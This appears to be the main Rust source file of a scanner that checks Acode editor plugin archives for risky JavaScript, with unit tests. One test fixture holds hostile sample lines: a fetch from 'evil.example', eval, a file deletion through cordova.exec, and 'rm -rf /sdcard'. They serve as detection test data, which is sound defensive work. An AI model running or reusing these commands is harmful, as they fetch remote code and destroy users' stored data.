mod archive;
mod cli;
mod js;
mod manifest;
mod markdown;
mod report;
mod rules;
mod severity;
mod terminal;

use std::process::ExitCode;

use clap::Parser;

use crate::{
    archive::PluginArchive,
    cli::{Cli, Command, OutputFormat},
    report::{Report, ScanError, Stats},
    rules::RuleContext,
    severity::Category,
};

fn main() -> ExitCode {
    let cli = Cli::parse();

    match run(cli) {
        Ok((report, format)) => match render_report(&report, format) {
            Ok(output) => {
                println!("{output}");
                ExitCode::SUCCESS
            }
            Err(error) => {
                eprintln!("{error}");
                ExitCode::FAILURE
            }
        },
        Err(error) => {
            eprintln!("{error}");
            ExitCode::FAILURE
        }
    }
}

fn run(cli: Cli) -> Result<(Report, OutputFormat), archive::ArchiveError> {
    match cli.command {
        Command::Scan {
            zip,
            format,
            json,
            markdown,
            summary,
            terminal,
            all_js,
        } => {
            let format = OutputFormat::from_flags(format, json, markdown, summary, terminal);
            scan_zip(&zip, ScanOptions { all_js }).map(|report| (report, format))
        }
    }
}

fn render_report(report: &Report, format: OutputFormat) -> Result<String, String> {
    match format {
        OutputFormat::Json => serde_json::to_string_pretty(report)
            .map_err(|error| format!("failed to serialize JSON report: {error}")),
        OutputFormat::Md => Ok(markdown::render_markdown(report)),
        OutputFormat::Summary => Ok(markdown::render_markdown_summary(report)),
        OutputFormat::Terminal => Ok(terminal::render_terminal(report)),
    }
}

#[derive(Debug, Clone, Copy, Default)]
struct ScanOptions {
    all_js: bool,
}

fn scan_zip(path: &std::path::Path, options: ScanOptions) -> Result<Report, archive::ArchiveError> {
    let mut report = Report::new(env!("CARGO_PKG_VERSION"));
    let archive = PluginArchive::read(path, &mut report)?;

    let manifest = match manifest::load_manifest(&archive, &mut report) {
        Some(manifest) => {
            report.plugin = Some(manifest.summary());
            Some(manifest)
        }
        None => None,
    };

    manifest::validate_manifest(manifest.as_ref(), &archive, &mut report);

    let js_files = archive.javascript_files(manifest.as_ref(), options.all_js, &mut report);
    let mut stats = Stats {
        files_scanned: archive.files.len(),
        bytes_scanned: archive
            .files
            .iter()
            .map(|file| file.bytes.len() as u64)
            .sum(),
        js_files_parsed: 0,
    };

    for file_name in js_files {
        let Some(file) = archive.file(&file_name) else {
            continue;
        };

        match std::str::from_utf8(&file.bytes) {
            Ok(source) => {
                stats.js_files_parsed += 1;
                report.sources.insert(file.name.clone(), source.to_string());
                let mut context = RuleContext::new(&file.name, source);
                rules::scan_source_text(&mut context);
                js::parse_and_scan(&mut context, &mut report);
                report.findings.extend(context.findings);
            }
            Err(error) => {
                report.errors.push(ScanError {
                    file: Some(file.name.clone()),
                    message: format!("JavaScript file is not valid UTF-8: {error}"),
                });
                report.add_finding(
                    "js.invalid_utf8",
                    crate::severity::Severity::Medium,
                    Category::Obfuscation,
                    Some(file.name.clone()),
                    None,
                    "JavaScript file is not valid UTF-8",
                    "scanner could not decode source text",
                    crate::severity::Confidence::High,
                );
            }
        }
    }

    report.stats = stats;
    report.deduplicate_findings();
    report.refresh_summary();
    Ok(report)
}

#[cfg(test)]
mod tests {
    use std::{
        fs::File,
        io::{Cursor, Write},
        path::Path,
    };

    use zip::{ZipWriter, write::FileOptions};

    use super::*;

    fn make_zip(path: &Path, files: &[(&str, &[u8])]) {
        let file = File::create(path).unwrap();
        let mut zip = ZipWriter::new(file);
        let options: FileOptions<'_, ()> = FileOptions::default();
        for (name, bytes) in files {
            zip.start_file(name, options).unwrap();
            zip.write_all(bytes).unwrap();
        }
        zip.finish().unwrap();
    }

    fn scan_fixture(files: &[(&str, &[u8])]) -> Report {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("plugin.zip");
        make_zip(&path, files);
        scan_zip(&path, ScanOptions::default()).unwrap()
    }

    #[test]
    fn scans_clean_minimal_plugin() {
        let report = scan_fixture(&[
            (
                "plugin.json",
                br#"{"id":"com.example.clean","name":"Clean","main":"main.js","version":"1.0.0"}"#,
            ),
            (
                "main.js",
                b"acode.setPluginInit('com.example.clean', () => {});",
            ),
        ]);

        assert!(report.errors.is_empty());
        assert!(
            report
                .findings
                .iter()
                .all(|finding| finding.severity != crate::severity::Severity::Critical)
        );
    }

    #[test]
    fn reports_suspicious_plugin() {
        let report = scan_fixture(&[
			(
				"plugin.json",
				br#"{"id":"com.example.bad","name":"Bad","main":"dist/main.js","version":"1.0.0"}"#,
			),
			(
				"dist/main.js",
				b"fetch('https://evil.example/p.js'); eval('alert(1)'); cordova.exec(null,null,'System','deleteFile',['/sdcard/a']); Executor.execute('rm -rf /sdcard');",
			),
		]);

        let ids: Vec<_> = report
            .findings
            .iter()
            .map(|finding| finding.id.as_str())
            .collect();
        assert!(ids.contains(&"network.fetch"));
        assert!(ids.contains(&"dynamic.eval"));
        assert!(ids.contains(&"cordova.exec"));
        assert!(ids.contains(&"cordova.executor"));
    }

    #[test]
    fn rejects_unreadable_zip_as_runtime_error() {
        let mut cursor = Cursor::new(Vec::<u8>::new());
        cursor.write_all(b"not a zip").unwrap();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bad.zip");
        std::fs::write(&path, cursor.into_inner()).unwrap();
        assert!(scan_zip(&path, ScanOptions::default()).is_err());
    }

    #[test]
    fn default_scan_uses_runtime_entry_and_manifest_files_only() {
        let report = scan_fixture(&[
			(
				"plugin.json",
				br#"{"id":"com.example.chunks","name":"Chunks","main":"dist/main.js","version":"1.0.0"}"#,
			),
			("dist/main.js", b"acode.setPluginInit('x',()=>{});"),
			("dist/123.main.js", b"eval('chunk')"),
		]);
        assert_eq!(report.stats.js_files_parsed, 1);
        assert!(
            !report
                .findings
                .iter()
                .any(|finding| finding.file.as_deref() == Some("dist/123.main.js"))
        );
    }

    #[test]
    fn all_js_scan_includes_generated_chunks() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("plugin.zip");
        make_zip(
			&path,
			&[
				(
					"plugin.json",
					br#"{"id":"com.example.chunks","name":"Chunks","main":"dist/main.js","version":"1.0.0"}"#,
				),
				("dist/main.js", b"acode.setPluginInit('x',()=>{});"),
				("dist/123.main.js", b"eval('chunk')"),
			],
		);
        let report = scan_zip(&path, ScanOptions { all_js: true }).unwrap();
        assert_eq!(report.stats.js_files_parsed, 2);
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.file.as_deref() == Some("dist/123.main.js"))
        );
    }

    #[test]
    fn falls_back_to_main_js_like_acode_loader() {
        let report = scan_fixture(&[
			(
				"plugin.json",
				br#"{"id":"com.example.fallback","name":"Fallback","main":"dist/missing.js","version":"1.0.0"}"#,
			),
			("main.js", b"eval('fallback')"),
		]);
        assert_eq!(report.stats.js_files_parsed, 1);
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.file.as_deref() == Some("main.js"))
        );
    }

    #[test]
    fn renders_markdown_report() {
        let report = scan_fixture(&[
            (
                "plugin.json",
                br#"{"id":"com.example.md","name":"Markdown","main":"main.js","version":"1.0.0"}"#,
            ),
            ("main.js", b"fetch('https://example.com')"),
        ]);
        let output = render_report(&report, OutputFormat::Md).unwrap();
        assert!(output.contains("# Plugin Scan Report"));
        assert!(output.contains("network.fetch"));
    }

    #[test]
    fn renders_markdown_summary_report() {
        let report = scan_fixture(&[
			(
				"plugin.json",
				br#"{"id":"com.example.summary","name":"Summary","main":"main.js","version":"1.0.0"}"#,
			),
			(
				"main.js",
				b"const terminal = acode.require('terminal'); Executor.execute('ls'); system.writeText('x');",
			),
		]);
        let output = render_report(&report, OutputFormat::Summary).unwrap();
        assert!(output.contains("# Plugin Security Summary"));
        assert!(output.contains("Shell command execution"));
        assert!(output.contains("Relevant code:"));
        assert!(output.contains("```js"));
        assert!(output.contains("Executor.execute('ls')"));
        assert!(!output.contains("## Findings"));
    }

    #[test]
    fn renders_terminal_report() {
        let report = scan_fixture(&[
			(
				"plugin.json",
				br#"{"id":"com.example.terminal","name":"Terminal","main":"main.js","version":"1.0.0"}"#,
			),
			("main.js", b"system.requestPermission('android.permission.CAMERA')"),
		]);
        let output = render_report(&report, OutputFormat::Terminal).unwrap();
        assert!(output.contains("Plugin Scan Report"));
        assert!(output.contains("system.permission_request"));
    }
}
